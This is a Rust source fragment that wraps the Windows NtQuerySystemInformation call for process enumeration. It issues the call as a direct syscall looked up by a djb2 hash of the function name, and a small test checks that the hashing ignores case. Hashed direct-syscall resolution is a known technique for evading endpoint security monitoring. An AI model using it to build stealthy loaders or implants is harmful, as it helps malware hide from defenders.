/// `NtQuerySystemInformation(SystemInformationClass, Buffer, Length, ReturnLength)` — 4 args.
/// Used by T-REX for process enumeration (SystemProcessInformation class 5).
pub unsafe fn nt_query_system_information(
    rt: &Runtime,
    info_class: u32,
    buffer: *mut u8,
    buf_len: u32,
    ret_len: &mut u32,
) -> Option<i32> {
    syscall4(
        rt,
        djb2(b"ntquerysysteminformation"),
        info_class as usize,
        buffer as usize,
        buf_len as usize,
        ret_len as *mut u32 as usize,
    )
}
#[cfg(test)]
mod tests {
    use super::*;
    #[cfg(target_arch = "x86_64")]
    #[test]
    fn djb2_keys_are_stable() {
        // The names the runtime looks up must hash consistently with the table.
        assert_eq!(
            djb2(b"ntallocatevirtualmemory"),
            djb2(b"NTALLOCATEVIRTUALMEMORY")
        );
    }
}
